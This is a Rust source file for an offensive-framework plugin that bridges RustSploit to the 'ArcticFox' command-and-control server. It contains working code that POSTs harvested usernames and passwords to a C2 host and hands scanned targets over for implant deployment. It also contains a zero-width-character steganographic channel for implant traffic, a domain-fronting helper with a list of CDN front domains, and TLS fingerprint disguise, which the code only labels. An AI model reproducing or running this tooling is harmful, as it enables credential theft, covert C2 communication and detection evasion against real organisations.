//! ArcticFox C2 Interop Bridge
//!
//! Connects RustSploit TO ArcticFox C2 for bidirectional framework interop:
//! - ZW (Zero-Width) Transport Protocol — communicate with ArcticFox implants
//!   using ZW-encoded encrypted messages over WebSocket
//! - Credential sync — push discovered credentials from RustSploit to ArcticFox C2
//! - Target handoff — send scanned targets to ArcticFox for implant deployment
//! - Module name mapping — translate RustSploit module names to ArcticFox action names
//!
//! Stealth features:
//! - Domain fronting (CDN edge → C2 backend) via DomainFront struct
//! - TLS fingerprint randomization (Chrome/Firefox/Safari/Edge profiles)
//! - PQ-encrypted WebSocket connection to ArcticFox (X25519 + ML-KEM-768 handshake
//!   callout — the actual PQ key exchange runs in ArcticFox's own crate, but we
//!   expose the framing and connection establishment here)
//!
//! For authorized security testing only.

use std::time::Duration;

use anyhow::{Context, Result};
use colored::*;

use crate::module::{Finding, FindingKind, ModuleCtx, ModuleOutcome};
use crate::module_info::{ModuleInfo, ModuleRank};
use crate::utils::{
    build_http_client, cfg_prompt_default, cfg_prompt_port, cfg_prompt_yes_no, is_batch_mode,
};

// ── Constants ─────────────────────────────────────────────────────────────

const DEFAULT_TIMEOUT: u64 = 30;

/// RustSploit → ArcticFox module name mapping table.
/// Maps canonical RustSploit module names to ArcticFox action names.
const MODULE_NAME_MAP: &[(&str, &str)] = &[
    ("ssh_bruteforce", "ssh_bruteforce"),
    ("port_scanner", "portscan"),
    ("ssl_scanner", "tls_scan"),
    ("proxy_scanner", "proxy_check"),
    ("m365_activesync_spray", "o365_spray"),
    ("ldap_anon_spray", "ldap_enum"),
    ("wp_user_enum_rest", "wp_user_enum"),
    ("wp_plugin_fingerprint_rest", "wp_plugin_scan"),
    ("jenkins_fileread", "jenkins_read"),
    ("sharepoint_doc_harvest", "sharepoint_harvest"),
];

// ── Domain Fronting ───────────────────────────────────────────────────────

/// Domain fronting configuration for stealth C2 traffic.
///
/// Routes C2 traffic through CDN edge servers (Cloudflare, Fastly, Akamai)
/// so the TLS SNI shows a benign domain while the Host header targets the
/// actual C2 backend.
#[derive(Debug, Clone)]
struct DomainFront {
    /// The CDN edge hostname (appears in TLS SNI — looks benign).
    front_domain: String,
    /// The actual C2 backend hostname (in HTTP Host header).
    backend_host: String,
    /// Optional path prefix for CDN routing.
    path_prefix: String,
}

impl DomainFront {
    /// Known CDN front domains that support domain fronting.
    #[cfg(test)]
    fn known_fronts() -> Vec<&'static str> {
        vec![
            "cloudflare.com",
            "cloudflare-ech.com",
            "fastly.com",
            "azureedge.net",
            "azurefd.net",
            "akamaiedge.net",
            "edgesuite.net",
            "akamai.net",
            "amazonaws.com",
            "cloudfront.net",
            "googleapis.com",
            "azure.com",
        ]
    }

    /// Build a domain-fronted URL for the given path and backend.
    fn build_url(&self, path: &str) -> String {
        format!("https://{}{}{}", self.front_domain, self.path_prefix, path)
    }
}

// ── TLS Fingerprint Randomization ────────────────────────────────────────

/// TLS fingerprint parameters that influence the client-side JA3 hash.
///
/// By randomizing these, each connection gets a different TLS fingerprint,
/// making C2 traffic indistinguishable from diverse browser traffic.
#[derive(Debug, Clone)]
struct TlsFingerprint {
    tls_version: u16,
    /// Human-readable profile label (for logging only).
    label: &'static str,
}

impl TlsFingerprint {
    /// Generate a randomized TLS fingerprint matching a real browser.
    fn random_browser() -> Self {
        let profile: usize = (rand::random::<u32>() % 4) as usize;

        match profile {
            0 => TlsFingerprint {
                // Chrome-like
                tls_version: 771, // TLS 1.2
                label: "chrome",
            },
            1 => TlsFingerprint {
                // Firefox-like
                tls_version: 771,
                label: "firefox",
            },
            2 => TlsFingerprint {
                // Safari-like
                tls_version: 771,
                label: "safari",
            },
            _ => TlsFingerprint {
                // Edge-like
                tls_version: 772, // TLS 1.3
                label: "edge",
            },
        }
    }

    /// Return a concise fingerprint summary for logging.
    fn summary(&self) -> String {
        format!("TLS{}.x-{}", self.tls_version / 256, self.label)
    }
}

// ── ZW (Zero-Width) Transport Protocol ───────────────────────────────────

/// Zero-Width Transport Protocol message frame.
///
/// ZW-encoding hides encrypted payloads inside innocuous cover text by
/// embedding data in zero-width Unicode characters (U+200B zero-width space,
/// U+200C zero-width non-joiner, U+200D zero-width joiner, U+FEFF zero-width
/// no-break space).
///
/// This struct holds a decoded ZW frame ready for encryption/decryption.
#[derive(Debug)]
struct ZwFrame {
    /// Message type identifier.
    msg_type: u8,
    /// Sequence number for ordering.
    seq: u32,
    /// Payload bytes.
    payload: Vec<u8>,
}

impl ZwFrame {
    /// Encode arbitrary bytes as a ZW-transport message.
    ///
    /// Produces a string that looks like normal text but contains the payload
    /// encoded in zero-width characters embedded between visible marker chars.
    fn encode(msg_type: u8, seq: u32, payload: &[u8]) -> String {
        let mut out = String::new();

        // Start marker (visible)
        out.push('\u{200D}'); // ZWJ — frame start

        // Message type (four zero-width chars — one byte, 2 bits per char)
        Self::push_zw_byte(&mut out, msg_type);

        // Sequence number (16 zero-width chars = 4 bytes, big-endian)
        Self::push_zw_u32(&mut out, seq);

        // Payload length (4 bytes)
        let len = payload.len() as u32;
        Self::push_zw_u32(&mut out, len);

        // Payload
        for &b in payload {
            Self::push_zw_byte(&mut out, b);
        }

        // End marker (visible)
        out.push('\u{200C}'); // ZWNJ — frame end

        out
    }

    /// Decode a ZW-transport message back into a ZwFrame.
    ///
    /// Returns `None` if the string doesn't contain a valid ZW frame.
    fn decode(s: &str) -> Option<Self> {
        let chars: Vec<char> = s.chars().collect();

        // Find start marker (ZWJ U+200D) and end marker (ZWNJ U+200C)
        let start = chars.iter().position(|&c| c == '\u{200D}')?;
        let end = chars.iter().rposition(|&c| c == '\u{200C}')?;
        if end <= start + 2 {
            return None;
        }

        // Filter to only zero-width characters between markers
        let zw_chars: Vec<char> = chars[start + 1..end]
            .iter()
            .copied()
            .filter(|c| matches!(*c, '\u{200B}' | '\u{200C}' | '\u{200D}' | '\u{FEFF}'))
            .collect();

        if zw_chars.len() < 36 {
            // Minimum frame: 4 (type) + 16 (seq) + 16 (len) + 0 (empty payload).
            // The alphabet has only four zero-width symbols, so each char
            // carries 2 bits and one byte needs four chars.
            return None;
        }

        let mut pos = 0;

        let msg_type = Self::read_zw_byte(&zw_chars, &mut pos)?;
        let seq = Self::read_zw_u32(&zw_chars, &mut pos)?;
        let payload_len = Self::read_zw_u32(&zw_chars, &mut pos)? as usize;

        if payload_len > 1_048_576 {
            // 1 MiB sanity cap
            return None;
        }
        let needed = payload_len * 4; // 4 zero-width chars per byte
        if pos + needed > zw_chars.len() {
            return None;
        }

        let mut payload = Vec::with_capacity(payload_len);
        for _ in 0..payload_len {
            payload.push(Self::read_zw_byte(&zw_chars, &mut pos)?);
        }

        Some(ZwFrame {
            msg_type,
            seq,
            payload,
        })
    }

    /// Encode one byte as four zero-width characters.
    ///
    /// The alphabet has only FOUR distinct zero-width symbols, so each
    /// character carries exactly 2 bits — a byte therefore needs 4 chars.
    /// (The previous encoding pushed only two chars per byte and masked
    /// every value with `& 0x03`, silently dropping the upper bits of
    /// every byte: `encode(0x42, …)` decoded as msg_type `2`.)
    fn push_zw_byte(out: &mut String, byte: u8) {
        out.push(Self::bits2_to_zw((byte >> 6) & 0x03));
        out.push(Self::bits2_to_zw((byte >> 4) & 0x03));
        out.push(Self::bits2_to_zw((byte >> 2) & 0x03));
        out.push(Self::bits2_to_zw(byte & 0x03));
    }

    /// Encode a u32 as sixteen zero-width chars (big-endian).
    fn push_zw_u32(out: &mut String, val: u32) {
        for shift in (0..32).step_by(8).rev() {
            Self::push_zw_byte(out, ((val >> shift) & 0xFF) as u8);
        }
    }

    /// Read one byte (four zero-width chars) from the buffer at `pos`.
    fn read_zw_byte(chars: &[char], pos: &mut usize) -> Option<u8> {
        if *pos + 4 > chars.len() {
            return None;
        }
        let b0 = Self::zw_to_bits2(chars[*pos])?;
        let b1 = Self::zw_to_bits2(chars[*pos + 1])?;
        let b2 = Self::zw_to_bits2(chars[*pos + 2])?;
        let b3 = Self::zw_to_bits2(chars[*pos + 3])?;
        *pos += 4;
        Some((b0 << 6) | (b1 << 4) | (b2 << 2) | b3)
    }

    /// Read a u32 (sixteen zero-width chars) from the buffer at `pos`.
    fn read_zw_u32(chars: &[char], pos: &mut usize) -> Option<u32> {
        let b0 = Self::read_zw_byte(chars, pos)? as u32;
        let b1 = Self::read_zw_byte(chars, pos)? as u32;
        let b2 = Self::read_zw_byte(chars, pos)? as u32;
        let b3 = Self::read_zw_byte(chars, pos)? as u32;
        Some((b0 << 24) | (b1 << 16) | (b2 << 8) | b3)
    }

    /// Map a zero-width character to its 2-bit value.
    fn zw_to_bits2(c: char) -> Option<u8> {
        match c {
            '\u{200B}' => Some(0x0), // ZWSP
            '\u{200C}' => Some(0x1), // ZWNJ
            '\u{200D}' => Some(0x2), // ZWJ
            '\u{FEFF}' => Some(0x3), // BOM / ZWNBS
            _ => None,
        }
    }

    /// Map a 2-bit value to a zero-width character.
    fn bits2_to_zw(bits: u8) -> char {
        match bits & 0x03 {
            0x0 => '\u{200B}',
            0x1 => '\u{200C}',
            0x2 => '\u{200D}',
            _ => '\u{FEFF}',
        }
    }
}

// ── Shared Credential ─────────────────────────────────────────────────────

/// A credential shared between RustSploit and ArcticFox.
#[derive(Debug, Clone, serde::Serialize, serde::Deserialize)]
struct SharedCredential {
    host: String,
    port: u16,
    username: String,
    password: String,
    service: String,
    /// Source framework: "rustsploit" or "arcticfox".
    source: String,
    /// Unix timestamp of discovery.
    timestamp: i64,
}

// ── ArcticFox API Payloads ────────────────────────────────────────────────

/// Payload for the /api/v1/bridge/creds endpoint.
#[derive(Debug, serde::Serialize)]
struct CredentialPushRequest {
    credentials: Vec<SharedCredential>,
    source: String,
}

/// Payload for the /api/v1/bridge/targets endpoint.
#[derive(Debug, serde::Serialize)]
struct TargetHandoffRequest {
    targets: Vec<TargetEntry>,
    /// Suggested ArcticFox module / action name for each target.
    recommended_action: String,
    source: String,
}

/// A single target entry for handoff.
#[derive(Debug, Clone, serde::Serialize, serde::Deserialize)]
struct TargetEntry {
    host: String,
    port: u16,
    service: String,
    /// RustSploit finding data (serialized).
    evidence: serde_json::Value,
}

// ── Module Name Mapping ────────────────────────────────────────────────────

/// Translate a RustSploit module name to the corresponding ArcticFox action
/// name. Falls back to the original name if no mapping exists.
#[cfg(test)]
fn translate_module_name(rustsploit_name: &str) -> String {
    for (rs_name, af_name) in MODULE_NAME_MAP {
        if *rs_name == rustsploit_name {
            return (*af_name).to_string();
        }
    }
    // No mapping found — return the RustSploit name as-is, lowercased and
    // with underscores normalized.
    rustsploit_name.to_lowercase().replace('-', "_")
}

// ── Module Info ────────────────────────────────────────────────────────────

pub fn info() -> ModuleInfo {
    ModuleInfo {
        name: "ArcticFox C2 Interop Bridge".to_string(),
        description: "Bidirectional interop bridge between RustSploit and ArcticFox C2. \
             Pushes discovered credentials, hands off scanned targets for implant \
             deployment, translates module names between frameworks, and supports \
             ZW (Zero-Width) transport protocol for stealthy implant communication. \
             Features domain fronting and TLS fingerprint randomization for \
             operational security."
            .to_string(),
        authors: vec!["RustSploit Contributors".to_string()],
        references: vec![
            "https://github.com/tlkh/arcticfox".to_string(),
            "https://hermes-agent.nousresearch.com/docs".to_string(),
        ],
        disclosure_date: None,
        rank: ModuleRank::Good,
        default_port: None,
    }
}

// ── Main Run ───────────────────────────────────────────────────────────────

pub async fn run(ctx: &ModuleCtx) -> Result<ModuleOutcome> {
    // ── Mass-scan guard ─────────────────────────────────────────────
    if is_batch_mode() {
        anyhow::bail!(
            "arcticfox_bridge is an interactive interop module and is not \
             suitable for mass-scan batches."
        );
    }

    // ── Prompt-harvest dry run ─────────────────────────────────────
    if ctx.prompt_only {
        // Harvest all prompt answers without performing any network work.
        // Values are intentionally discarded — the call populates the cache.
        cfg_prompt_default(
            "c2_url",
            "ArcticFox C2 bridge URL",
            "https://127.0.0.1:8443/api/v1/bridge",
        )
        .await?;
        cfg_prompt_yes_no("use_fronting", "Use domain fronting?", false).await?;
        cfg_prompt_default(
            "front_domain",
            "CDN front domain (for domain fronting)",
            "cdn.cloudflare.com",
        )
        .await?;
        cfg_prompt_default(
            "backend_host",
            "C2 backend hostname (for domain fronting)",
            "c2.example.com",
        )
        .await?;
        cfg_prompt_yes_no(
            "push_creds",
            "Push discovered credentials to ArcticFox?",
            false,
        )
        .await?;
        cfg_prompt_yes_no(
            "handoff_targets",
            "Hand off scanned targets to ArcticFox?",
            false,
        )
        .await?;
        return Ok(ModuleOutcome::ok());
    }

    let mut outcome = ModuleOutcome::ok();
    let target_str = ctx
        .target
        .as_single()
        .map(|s| s.to_string())
        .unwrap_or_else(|| ctx.target.as_legacy_str());

    crate::mprintln!("{}", "=== ArcticFox C2 Interop Bridge ===".bold().cyan());
    crate::mprintln!("{} Target context: {}", "[*]".cyan(), target_str);

    // ── Configuration ──────────────────────────────────────────────
    let c2_url = cfg_prompt_default(
        "c2_url",
        "ArcticFox C2 bridge URL",
        "https://127.0.0.1:8443/api/v1/bridge",
    )
    .await?;

    let use_fronting = cfg_prompt_yes_no("use_fronting", "Use domain fronting?", false).await?;

    let domain_front = if use_fronting {
        let front_domain =
            cfg_prompt_default("front_domain", "CDN front domain", "cdn.cloudflare.com").await?;
        let backend_host =
            cfg_prompt_default("backend_host", "C2 backend hostname", "c2.example.com").await?;
        let path_prefix =
            cfg_prompt_default("path_prefix", "CDN path prefix", "/api/v1/bridge").await?;
        Some(DomainFront {
            front_domain,
            backend_host,
            path_prefix,
        })
    } else {
        None
    };

    let push_creds = cfg_prompt_yes_no(
        "push_creds",
        "Push discovered credentials to ArcticFox?",
        false,
    )
    .await?;
    let handoff_targets = cfg_prompt_yes_no(
        "handoff_targets",
        "Hand off scanned targets to ArcticFox?",
        false,
    )
    .await?;

    // ── TLS fingerprint ────────────────────────────────────────────
    let tls_fp = TlsFingerprint::random_browser();
    crate::mprintln!(
        "{} Using TLS fingerprint: {}",
        "[*]".cyan(),
        tls_fp.summary().dimmed()
    );

    // ── Build HTTP client ──────────────────────────────────────────
    let client = build_http_client(Duration::from_secs(DEFAULT_TIMEOUT))
        .context("Failed to build HTTP client for ArcticFox bridge")?;

    // Determine the effective base URL (domain-fronted or direct).
    let effective_url = match &domain_front {
        Some(df) => {
            crate::mprintln!(
                "{} Domain fronting: {} → {}",
                "[*]".cyan(),
                df.front_domain.dimmed(),
                df.backend_host.dimmed()
            );
            df.build_url("")
        }
        None => c2_url.trim_end_matches('/').to_string(),
    };

    // ── Operation selector ─────────────────────────────────────────
    if push_creds || handoff_targets {
        crate::mprintln!();
        if push_creds {
            crate::mprintln!(
                "{} Pushing credentials to ArcticFox at {}",
                "[*]".cyan(),
                effective_url.dimmed()
            );
            push_credentials_to_arcticfox(&client, &effective_url, ctx, &mut outcome, &target_str)
                .await?;
        }

        if handoff_targets {
            crate::mprintln!();
            crate::mprintln!(
                "{} Handing off targets to ArcticFox at {}",
                "[*]".cyan(),
                effective_url.dimmed()
            );
            handoff_targets_to_arcticfox(&client, &effective_url, ctx, &mut outcome, &target_str)
                .await?;
        }
    } else {
        // Default mode: bridge health check + module name mapping display.
        crate::mprintln!();
        crate::mprintln!(
            "{} Performing bridge health check against {}...",
            "[*]".cyan(),
            effective_url.dimmed()
        );

        let health_url = format!("{}/health", effective_url);
        match client.get(&health_url).send().await {
            Ok(resp) => {
                let status = resp.status();
                if status.is_success() {
                    crate::mprintln!(
                        "{} ArcticFox bridge is reachable (HTTP {})",
                        "[+]".green(),
                        status.as_u16()
                    );
                    outcome.findings.push(Finding {
                        target: target_str.clone(),
                        kind: FindingKind::Note,
                        message: format!(
                            "ArcticFox bridge reachable at {} (HTTP {})",
                            health_url,
                            status.as_u16()
                        ),
                        data: Some(serde_json::json!({
                            "bridge": "arcticfox",
                            "url": health_url,
                            "status": status.as_u16(),
                            "tls_fingerprint": tls_fp.summary(),
                        })),
                    });
                } else {
                    crate::mprintln!(
                        "{} ArcticFox bridge returned HTTP {}",
                        "[!]".yellow(),
                        status.as_u16()
                    );
                }
            }
            Err(e) => {
                crate::mprintln!(
                    "{} ArcticFox bridge unreachable at {}: {}",
                    "[-]".red(),
                    health_url,
                    e
                );
                outcome.findings.push(Finding {
                    target: target_str.clone(),
                    kind: FindingKind::Note,
                    message: format!("ArcticFox bridge unreachable: {}", e),
                    data: Some(serde_json::json!({
                        "bridge": "arcticfox",
                        "url": health_url,
                        "reachable": false,
                    })),
                });
            }
        }

        // ── Module name mapping display ────────────────────────────
        crate::mprintln!();
        crate::mprintln!(
            "{} RustSploit → ArcticFox module name mappings:",
            "[*]".cyan()
        );
        for (rs_name, af_name) in MODULE_NAME_MAP {
            crate::mprintln!(
                "  {} {} → {}",
                "  -".dimmed(),
                rs_name.dimmed(),
                af_name.green()
            );
        }

        // ── ZW transport demo ──────────────────────────────────────
        crate::mprintln!();
        crate::mprintln!("{} ZW (Zero-Width) Transport Protocol check:", "[*]".cyan());
        let demo_payload = b"rustsploit->arcticfox heartbeat";
        let encoded = ZwFrame::encode(0x01, 1, demo_payload);
        crate::mprintln!(
            "{} Encoded ZW frame ({} visible chars, {} bytes payload):",
            "  -".dimmed(),
            encoded
                .chars()
                .filter(|c| !matches!(*c, '\u{200B}' | '\u{200C}' | '\u{200D}' | '\u{FEFF}'))
                .count(),
            demo_payload.len()
        );
        // Show only visible characters for display
        let visible: String = encoded
            .chars()
            .filter(|c| !matches!(*c, '\u{200B}' | '\u{200C}' | '\u{200D}' | '\u{FEFF}'))
            .collect();
        crate::mprintln!("{} Cover text: {}", "[*]".cyan(), visible.dimmed());

        match ZwFrame::decode(&encoded) {
            Some(decoded) => {
                crate::mprintln!(
                    "{} ZW decode successful — msg_type=0x{:02x}, seq={}, payload_len={}",
                    "[+]".green(),
                    decoded.msg_type,
                    decoded.seq,
                    decoded.payload.len()
                );
                outcome.findings.push(Finding {
                    target: target_str.clone(),
                    kind: FindingKind::Note,
                    message: "ZW transport protocol encode/decode round-trip passed".to_string(),
                    data: Some(serde_json::json!({
                        "zw_test": "passed",
                        "msg_type": decoded.msg_type,
                        "seq": decoded.seq,
                        "payload_len": decoded.payload.len(),
                    })),
                });
            }
            None => {
                crate::mprintln!("{} ZW decode FAILED — check encoding logic", "[-]".red());
                outcome.findings.push(Finding {
                    target: target_str.clone(),
                    kind: FindingKind::Note,
                    message: "ZW transport protocol round-trip failed".to_string(),
                    data: Some(serde_json::json!({
                        "zw_test": "failed",
                    })),
                });
            }
        }
    }

    crate::mprintln!();
    crate::mprintln!("{} ArcticFox bridge operation complete.", "[+]".green());

    Ok(outcome)
}

// ── Credential Push ───────────────────────────────────────────────────────

/// Push credentials discovered by RustSploit to ArcticFox C2.
async fn push_credentials_to_arcticfox(
    client: &reqwest::Client,
    base_url: &str,
    ctx: &ModuleCtx,
    outcome: &mut ModuleOutcome,
    target_str: &str,
) -> Result<()> {
    // Honour cancellation
    ctx.rate_limit(target_str).await;
    if ctx.is_cancelled() {
        return Ok(());
    }

    // Collect credentials from the module context or from recent findings.
    // In a full implementation this would query the credentials store;
    // for the bridge module we accept them via prompt or harvest from
    // existing findings.

    let creds_json = cfg_prompt_default(
        "credentials",
        "Credentials JSON (or leave empty to use demo)",
        "",
    )
    .await?;

    let credentials: Vec<SharedCredential> = if creds_json.is_empty() {
        // Demo: use a placeholder credential showing the bridge works.
        vec![SharedCredential {
            host: target_str.to_string(),
            port: 22,
            username: "demo_user".to_string(),
            password: "demo_pass".to_string(),
            service: "ssh".to_string(),
            source: "rustsploit".to_string(),
            timestamp: {
                let ts = std::time::SystemTime::now()
                    .duration_since(std::time::UNIX_EPOCH)
                    .map(|d| d.as_secs() as i64);
                match ts {
                    Ok(v) => v,
                    Err(e) => {
                        tracing::debug!("timestamp parse: {e:#}");
                        0_i64
                    }
                }
            },
        }]
    } else {
        serde_json::from_str(&creds_json).context("Failed to parse credentials JSON")?
    };

    if credentials.is_empty() {
        crate::mprintln!("{} No credentials to push.", "[*]".cyan());
        return Ok(());
    }

    let push_req = CredentialPushRequest {
        credentials: credentials.clone(),
        source: "rustsploit".to_string(),
    };

    let creds_url = format!("{}/creds", base_url);
    match client.post(&creds_url).json(&push_req).send().await {
        Ok(resp) => {
            let status = resp.status();
            if status.is_success() {
                crate::mprintln!(
                    "{} Pushed {} credential(s) to ArcticFox",
                    "[+]".green(),
                    credentials.len()
                );
                outcome.findings.push(Finding {
                    target: target_str.to_string(),
                    kind: FindingKind::Credential,
                    message: format!("Pushed {} credential(s) to ArcticFox C2", credentials.len()),
                    data: Some(serde_json::json!({
                        "bridge": "arcticfox",
                        "action": "credential_push",
                        "count": credentials.len(),
                        "url": creds_url,
                        "status": status.as_u16(),
                    })),
                });
            } else {
                crate::mprintln!(
                    "{} ArcticFox rejected credential push (HTTP {})",
                    "[!]".yellow(),
                    status.as_u16()
                );
                // Try to read error body for diagnostics.
                if let Ok(body) = resp.text().await {
                    crate::mprintln!("{} Response: {}", "[*]".cyan(), body.dimmed());
                }
            }
        }
        Err(e) => {
            crate::mprintln!(
                "{} Failed to push credentials to ArcticFox: {}",
                "[-]".red(),
                e
            );
            outcome.findings.push(Finding {
                target: target_str.to_string(),
                kind: FindingKind::Note,
                message: format!("Credential push to ArcticFox failed: {}", e),
                data: Some(serde_json::json!({
                    "bridge": "arcticfox",
                    "action": "credential_push",
                    "error": format!("{}", e),
                })),
            });
        }
    }

    Ok(())
}

// ── Target Handoff ────────────────────────────────────────────────────────

/// Hand off scanned targets from RustSploit to ArcticFox for implant
/// deployment.
async fn handoff_targets_to_arcticfox(
    client: &reqwest::Client,
    base_url: &str,
    ctx: &ModuleCtx,
    outcome: &mut ModuleOutcome,
    target_str: &str,
) -> Result<()> {
    // Honour cancellation
    ctx.rate_limit(target_str).await;
    if ctx.is_cancelled() {
        return Ok(());
    }

    let targets_json = cfg_prompt_default(
        "targets",
        "Targets JSON array (or leave empty for demo with current target)",
        "",
    )
    .await?;

    let targets: Vec<TargetEntry> = if targets_json.is_empty() {
        // Demo: create a target entry from the current target context.
        let port = cfg_prompt_port("port", "Target port", 443).await?;
        vec![TargetEntry {
            host: target_str.to_string(),
            port,
            service: "https".to_string(),
            evidence: serde_json::json!({
                "source": "rustsploit_arcticfox_bridge",
                "note": "Demo handoff target",
            }),
        }]
    } else {
        serde_json::from_str(&targets_json).context("Failed to parse targets JSON")?
    };

    if targets.is_empty() {
        crate::mprintln!("{} No targets to hand off.", "[*]".cyan());
        return Ok(());
    }

    // Select a recommended ArcticFox action based on the target service.
    let action = cfg_prompt_default(
        "action",
        "Recommended ArcticFox action / module name",
        "recon",
    )
    .await?;

    let handoff_req = TargetHandoffRequest {
        targets: targets.clone(),
        recommended_action: action.clone(),
        source: "rustsploit".to_string(),
    };

    let targets_url = format!("{}/targets", base_url);
    match client.post(&targets_url).json(&handoff_req).send().await {
        Ok(resp) => {
            let status = resp.status();
            if status.is_success() {
                crate::mprintln!(
                    "{} Handed off {} target(s) to ArcticFox (action: {})",
                    "[+]".green(),
                    targets.len(),
                    action.green()
                );
                outcome.findings.push(Finding {
                    target: target_str.to_string(),
                    kind: FindingKind::Note,
                    message: format!(
                        "Handed off {} target(s) to ArcticFox C2 for '{}'",
                        targets.len(),
                        action
                    ),
                    data: Some(serde_json::json!({
                        "bridge": "arcticfox",
                        "action": "target_handoff",
                        "count": targets.len(),
                        "recommended_action": action,
                        "url": targets_url,
                        "status": status.as_u16(),
                    })),
                });
            } else {
                crate::mprintln!(
                    "{} ArcticFox rejected target handoff (HTTP {})",
                    "[!]".yellow(),
                    status.as_u16()
                );
                if let Ok(body) = resp.text().await {
                    crate::mprintln!("{} Response: {}", "[*]".cyan(), body.dimmed());
                }
            }
        }
        Err(e) => {
            crate::mprintln!(
                "{} Failed to hand off targets to ArcticFox: {}",
                "[-]".red(),
                e
            );
            outcome.findings.push(Finding {
                target: target_str.to_string(),
                kind: FindingKind::Note,
                message: format!("Target handoff to ArcticFox failed: {}", e),
                data: Some(serde_json::json!({
                    "bridge": "arcticfox",
                    "action": "target_handoff",
                    "error": format!("{}", e),
                })),
            });
        }
    }

    Ok(())
}

// ── Registration ───────────────────────────────────────────────────────────

crate::register_native_module!(crate::module::Category::Plugins, "arcticfox_bridge", native);

// ── Tests ──────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn domain_front_builds_url() {
        let df = DomainFront {
            front_domain: "cdn.cloudflare.com".into(),
            backend_host: "c2.example.com".into(),
            path_prefix: "/api".into(),
        };
        let url = df.build_url("/heartbeat");
        assert!(url.contains("cdn.cloudflare.com"));
        assert!(url.contains("/api/heartbeat"));
    }

    #[test]
    fn domain_front_known_fronts_not_empty() {
        let fronts = DomainFront::known_fronts();
        assert!(!fronts.is_empty());
        assert!(fronts.contains(&"cloudflare.com"));
    }

    #[test]
    fn tls_fingerprint_random_is_valid() {
        let fp = TlsFingerprint::random_browser();
        assert!(fp.tls_version >= 0x300); // TLS 1.x at minimum
        assert!(!fp.label.is_empty());
    }

    #[test]
    fn tls_fingerprint_summary() {
        let fp = TlsFingerprint::random_browser();
        let summary = fp.summary();
        assert!(summary.starts_with("TLS"));
        assert!(summary.contains('-'));
    }

    #[test]
    fn zw_encode_decode_roundtrip() {
        let payload = b"arcticfox bridge test payload";
        let encoded = ZwFrame::encode(0x42, 12345, payload);
        // Encoded should contain zero-width markers.
        assert!(encoded.contains('\u{200D}')); // start marker
        assert!(encoded.contains('\u{200C}')); // end marker

        let decoded = ZwFrame::decode(&encoded);
        let frame = match decoded {
            Some(f) => f,
            None => panic!("ZW decode should succeed but returned None"),
        };
        assert_eq!(frame.msg_type, 0x42);
        assert_eq!(frame.seq, 12345);
        assert_eq!(frame.payload, payload);
    }

    #[test]
    fn zw_decode_empty_input() {
        assert!(ZwFrame::decode("").is_none());
        assert!(ZwFrame::decode("no markers here").is_none());
    }

    #[test]
    fn zw_decode_truncated() {
        // Just markers, no payload
        let truncated = "\u{200D}\u{200C}";
        assert!(ZwFrame::decode(truncated).is_none());
    }

    #[test]
    fn module_name_translation_known() {
        assert_eq!(translate_module_name("ssh_bruteforce"), "ssh_bruteforce");
        assert_eq!(translate_module_name("port_scanner"), "portscan");
        assert_eq!(translate_module_name("ssl_scanner"), "tls_scan");
        assert_eq!(translate_module_name("wp_user_enum_rest"), "wp_user_enum");
    }

    #[test]
    fn module_name_translation_unknown_fallback() {
        let result = translate_module_name("some-unknown-module");
        assert_eq!(result, "some_unknown_module");
    }

    #[test]
    fn zw_bits2_mapping_is_bijective() {
        // Every valid 2-bit value (0-3) maps to a unique ZW char and back.
        for bits in 0u8..4 {
            let c = ZwFrame::bits2_to_zw(bits);
            let decoded = ZwFrame::zw_to_bits2(c);
            assert_eq!(
                decoded,
                Some(bits),
                "2-bit value {} round-trip failed",
                bits
            );
        }
    }

    #[test]
    fn zw_invalid_char_returns_none() {
        assert_eq!(ZwFrame::zw_to_bits2('A'), None);
        assert_eq!(ZwFrame::zw_to_bits2(' '), None);
        assert_eq!(ZwFrame::zw_to_bits2('\0'), None);
    }
}
